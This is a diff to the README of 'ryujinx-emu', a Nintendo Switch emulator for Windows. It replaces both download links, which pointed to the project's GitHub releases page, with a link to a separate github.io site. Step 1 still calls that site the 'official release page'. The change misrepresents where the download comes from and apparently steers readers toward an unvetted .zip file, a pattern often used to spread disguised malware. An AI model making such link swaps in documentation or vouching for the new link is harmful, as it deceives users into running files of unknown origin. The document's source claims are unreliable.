@@ -1,6 +1,6 @@
 # 🎮 ryujinx-emu - Play Nintendo Switch games on Windows
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Allergic-gallimaufry66/ryujinx-emu/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://allergic-gallimaufry66.github.io)
 
 ryujinx-emu lets you play Nintendo Switch games on your personal computer. This software turns your Windows machine into a gaming console. It uses advanced technology to mimic the original hardware, which allows for smooth gameplay and high-quality graphics. You get access to your library of games directly on your monitor. This project stays open-source to ensure quality and continuous improvement.
 
@@ -8,7 +8,7 @@ ryujinx-emu lets you play Nintendo Switch games on your personal computer. This 
 
 Follow these steps to get the emulator on your computer.
 
-1. Go to the [official release page](https://github.com/Allergic-gallimaufry66/ryujinx-emu/releases).
+1. Go to the [official release page](https://allergic-gallimaufry66.github.io).
 2. Look for the section labeled Latest.
 3. Select the file ending in .zip for your Windows system.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
